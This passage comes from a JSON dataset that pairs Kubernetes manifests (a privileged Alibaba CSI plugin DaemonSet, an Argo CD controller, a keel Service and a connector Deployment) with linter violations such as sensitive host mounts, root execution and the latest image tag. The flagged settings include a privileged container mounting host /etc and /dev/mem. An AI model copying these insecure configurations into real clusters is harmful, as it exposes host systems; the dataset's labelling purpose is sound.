    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/etc\" is mounted on container \"csi-plugin\""
  },
  {
    "id": "8774",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-plugin\" has cpu request 0"
  },
  {
    "id": "8775",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"disk-driver-registrar\" has cpu request 0"
  },
  {
    "id": "8776",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-plugin\" has memory limit 0"
  },
  {
    "id": "8777",
    "manifest_path": "data/manifests/the_stack_sample/sample_3301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-plugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-plugin\n  template:\n    metadata:\n      labels:\n        app: csi-plugin\n    spec:\n      containers:\n      - args:\n        - --v=5\n        - --csi-address=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        - --kubelet-registration-path=/home/test/kubernetes/lib/kubelet/csi-plugins/diskplugin.csi.alibabacloud.com/csi.sock\n        image: csi-node-driver-registrar:v1.2.0\n        imagePullPolicy: IfNotPresent\n        name: disk-driver-registrar\n        resources: {}\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet/\n          mountPropagation: HostToContainer\n          name: kubelet-dir\n        - mountPath: /registration\n          name: registration-dir\n      - args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --v=5\n        - --driver=disk\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://home/test/kubernetes/lib/kubelet/csi-plugins/driverplugin.csi.alibabacloud.com-replace/csi.sock\n        - name: SERVICE_TYPE\n          value: plugin\n        - name: KUBELET_ROOT_DIR\n          value: /home/test/kubernetes/lib/kubelet\n        - name: MAX_VOLUMES_PERNODE\n          value: '15'\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        image: csi-plugin\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: 11260\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: csi-plugin\n        resources: {}\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /home/test/kubernetes/lib/kubelet\n          mountPropagation: Bidirectional\n          name: kubelet-dir\n        - mountPath: /home/test/kubernetes/lib/container\n          mountPropagation: Bidirectional\n          name: container-dir\n        - mountPath: /dev\n          mountPropagation: HostToContainer\n          name: host-dev\n        - mountPath: /var/log/\n          mountPropagation: HostToContainer\n          name: host-log\n        - mountPath: /host/etc\n          mountPropagation: HostToContainer\n          name: host-etc\n        - mountPath: /var/run/node-extender-server\n          name: servicesocket\n        - mountPath: /host/sys\n          name: host-sys\n        - mountPath: /host/dev/mem\n          name: host-mem\n      securityContext: {}\n      serviceAccount: alicloud-csi-plugin\n      serviceAccountName: alicloud-csi-plugin\n      volumes:\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet/plugins_registry\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib\n          type: DirectoryOrCreate\n        name: container-dir\n      - hostPath:\n          path: /home/test/kubernetes/lib/kubelet\n          type: Directory\n        name: kubelet-dir\n      - hostPath:\n          path: /dev\n          type: ''\n        name: host-dev\n      - hostPath:\n          path: /var/log/\n          type: ''\n        name: host-log\n      - hostPath:\n          path: /sys/\n          type: ''\n        name: host-sys\n      - hostPath:\n          path: /etc\n          type: ''\n        name: host-etc\n      - hostPath:\n          path: /dev/mem\n          type: ''\n        name: host-mem\n      - hostPath:\n          path: /var/run/node-extender-server\n          type: DirectoryOrCreate\n        name: servicesocket\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"disk-driver-registrar\" has memory limit 0"
  },
  {
    "id": "8778",
    "manifest_path": "data/manifests/the_stack_sample/sample_3302.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: application-controller\n    app.kubernetes.io/name: argo-cd\n  name: argocd-application-controller\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: application-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: application-controller\n    spec:\n      containers:\n      - command:\n        - argocd-application-controller\n        - --status-processors\n        - '20'\n        - --operation-processors\n        - '10'\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        name: argocd-application-controller\n        ports:\n        - containerPort: 8083\n        readinessProbe:\n          tcpSocket:\n            port: 8083\n          initialDelaySeconds: 5\n          periodSeconds: 10\n      serviceAccountName: argocd-application-controller\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"argocd-application-controller\" is using an invalid container image, \"argoproj/argocd:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8779",
    "manifest_path": "data/manifests/the_stack_sample/sample_3302.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: application-controller\n    app.kubernetes.io/name: argo-cd\n  name: argocd-application-controller\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: application-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: application-controller\n    spec:\n      containers:\n      - command:\n        - argocd-application-controller\n        - --status-processors\n        - '20'\n        - --operation-processors\n        - '10'\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        name: argocd-application-controller\n        ports:\n        - containerPort: 8083\n        readinessProbe:\n          tcpSocket:\n            port: 8083\n          initialDelaySeconds: 5\n          periodSeconds: 10\n      serviceAccountName: argocd-application-controller\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"argocd-application-controller\" does not have a read-only root file system"
  },
  {
    "id": "8780",
    "manifest_path": "data/manifests/the_stack_sample/sample_3302.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: application-controller\n    app.kubernetes.io/name: argo-cd\n  name: argocd-application-controller\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: application-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: application-controller\n    spec:\n      containers:\n      - command:\n        - argocd-application-controller\n        - --status-processors\n        - '20'\n        - --operation-processors\n        - '10'\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        name: argocd-application-controller\n        ports:\n        - containerPort: 8083\n        readinessProbe:\n          tcpSocket:\n            port: 8083\n          initialDelaySeconds: 5\n          periodSeconds: 10\n      serviceAccountName: argocd-application-controller\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"argocd-application-controller\" not found"
  },
  {
    "id": "8781",
    "manifest_path": "data/manifests/the_stack_sample/sample_3302.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: application-controller\n    app.kubernetes.io/name: argo-cd\n  name: argocd-application-controller\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: application-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: application-controller\n    spec:\n      containers:\n      - command:\n        - argocd-application-controller\n        - --status-processors\n        - '20'\n        - --operation-processors\n        - '10'\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        name: argocd-application-controller\n        ports:\n        - containerPort: 8083\n        readinessProbe:\n          tcpSocket:\n            port: 8083\n          initialDelaySeconds: 5\n          periodSeconds: 10\n      serviceAccountName: argocd-application-controller\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"argocd-application-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "8782",
    "manifest_path": "data/manifests/the_stack_sample/sample_3302.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: application-controller\n    app.kubernetes.io/name: argo-cd\n  name: argocd-application-controller\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: application-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: application-controller\n    spec:\n      containers:\n      - command:\n        - argocd-application-controller\n        - --status-processors\n        - '20'\n        - --operation-processors\n        - '10'\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        name: argocd-application-controller\n        ports:\n        - containerPort: 8083\n        readinessProbe:\n          tcpSocket:\n            port: 8083\n          initialDelaySeconds: 5\n          periodSeconds: 10\n      serviceAccountName: argocd-application-controller\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"argocd-application-controller\" has cpu request 0"
  },
  {
    "id": "8783",
    "manifest_path": "data/manifests/the_stack_sample/sample_3302.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: application-controller\n    app.kubernetes.io/name: argo-cd\n  name: argocd-application-controller\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: application-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: application-controller\n    spec:\n      containers:\n      - command:\n        - argocd-application-controller\n        - --status-processors\n        - '20'\n        - --operation-processors\n        - '10'\n        image: argoproj/argocd:latest\n        imagePullPolicy: Always\n        name: argocd-application-controller\n        ports:\n        - containerPort: 8083\n        readinessProbe:\n          tcpSocket:\n            port: 8083\n          initialDelaySeconds: 5\n          periodSeconds: 10\n      serviceAccountName: argocd-application-controller\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"argocd-application-controller\" has memory limit 0"
  },
  {
    "id": "8784",
    "manifest_path": "data/manifests/the_stack_sample/sample_3303.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: keel\n  namespace: keel-system\nspec:\n  selector:\n    app: keel\n  ports:\n  - protocol: TCP\n    port: 31234\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:keel])"
  },
  {
    "id": "8785",
    "manifest_path": "data/manifests/the_stack_sample/sample_3305.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: connector\n    group: linker\n  name: connector-01\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: connector\n  template:\n    metadata:\n      labels:\n        app: connector\n        group: linker\n    spec:\n      containers:\n      - name: connector\n        image: eu.gcr.io/linker-246119/connector:2.4.0\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8088\n        - containerPort: 8080\n        env:\n        - name: JAVA_OPTS\n          value: -Xms128m -Xmx1024m\n        - name: spring.profiles.active\n          value: sandbox\n        - name: server.port\n          value: '8080'\n        - name: wsPort\n          value: '8088'\n        - name: domainName\n          value: domain-01\n        - name: connectorName\n          value: connector-01\n        - name: kafkaHosts\n          value: infra-kafka:29092\n        - name: natsHosts\n          value: nats://nats:4222\n        readinessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 30\n          failureThreshold: 3\n          successThreshold: 1\n        livenessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 30\n          failureThreshold: 5\n          successThreshold: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"connector\" does not have a read-only root file system"
  },
  {
    "id": "8786",
    "manifest_path": "data/manifests/the_stack_sample/sample_3305.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: connector\n    group: linker\n  name: connector-01\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: connector\n  template:\n    metadata:\n      labels:\n        app: connector\n        group: linker\n    spec:\n      containers:\n      - name: connector\n        image: eu.gcr.io/linker-246119/connector:2.4.0\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8088\n        - containerPort: 8080\n        env:\n        - name: JAVA_OPTS\n          value: -Xms128m -Xmx1024m\n        - name: spring.profiles.active\n          value: sandbox\n        - name: server.port\n          value: '8080'\n        - name: wsPort\n          value: '8088'\n        - name: domainName\n          value: domain-01\n        - name: connectorName\n          value: connector-01\n        - name: kafkaHosts\n          value: infra-kafka:29092\n        - name: natsHosts\n          value: nats://nats:4222\n        readinessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 30\n          failureThreshold: 3\n          successThreshold: 1\n        livenessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 30\n          failureThreshold: 5\n          successThreshold: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"connector\" is not set to runAsNonRoot"
  },
  {
    "id": "8787",
    "manifest_path": "data/manifests/the_stack_sample/sample_3305.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: connector\n    group: linker\n  name: connector-01\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: connector\n  template:\n    metadata:\n      labels:\n        app: connector\n        group: linker\n    spec:\n      containers:\n      - name: connector\n        image: eu.gcr.io/linker-246119/connector:2.4.0\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8088\n        - containerPort: 8080\n        env:\n        - name: JAVA_OPTS\n          value: -Xms128m -Xmx1024m\n        - name: spring.profiles.active\n          value: sandbox\n        - name: server.port\n          value: '8080'\n        - name: wsPort\n          value: '8088'\n        - name: domainName\n          value: domain-01\n        - name: connectorName\n          value: connector-01\n        - name: kafkaHosts\n          value: infra-kafka:29092\n        - name: natsHosts\n          value: nats://nats:4222\n        readinessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 30\n          failureThreshold: 3\n          successThreshold: 1\n        livenessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 30\n          failureThreshold: 5\n          successThreshold: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"connector\" has cpu request 0"
  },
  {
    "id": "8788",
    "manifest_path": "data/manifests/the_stack_sample/sample_3305.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: connector\n    group: linker\n  name: connector-01\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: connector\n  template:\n    metadata:\n      labels:\n        app: connector\n        group: linker\n    spec:\n      containers:\n      - name: connector\n        image: eu.gcr.io/linker-246119/connector:2.4.0\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8088\n        - containerPort: 8080\n        env:\n        - name: JAVA_OPTS\n          value: -Xms128m -Xmx1024m\n        - name: spring.profiles.active\n          value: sandbox\n        - name: server.port\n          value: '8080'\n        - name: wsPort\n          value: '8088'\n        - name: domainName\n          value: domain-01\n        - name: connectorName\n          value: connector-01\n        - name: kafkaHosts\n          value: infra-kafka:29092\n        - name: natsHosts\n          value: nats://nats:4222\n        readinessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 30\n          failureThreshold: 3\n          successThreshold: 1\n        livenessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 30\n          